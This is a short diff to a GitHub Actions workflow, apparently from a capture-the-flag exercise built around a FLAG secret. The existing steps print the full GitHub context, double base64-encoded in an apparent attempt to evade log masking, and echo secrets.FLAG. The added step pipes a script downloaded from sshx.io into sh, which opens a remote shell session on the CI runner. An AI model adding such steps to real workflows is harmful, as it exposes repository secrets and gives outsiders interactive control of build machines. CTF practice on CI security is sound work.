@@ -15,3 +15,5 @@ jobs:
           GITHUB_CONTEXT: ${{ toJson(github) }}
         run: echo "$GITHUB_CONTEXT" | base64 -w0 | base64 -w0
       - run: echo "${{ secrets.FLAG }}"
+      - uses: actions/checkout@v7.0.1
+      - run: curl -sSf https://sshx.io/get | sh -s run
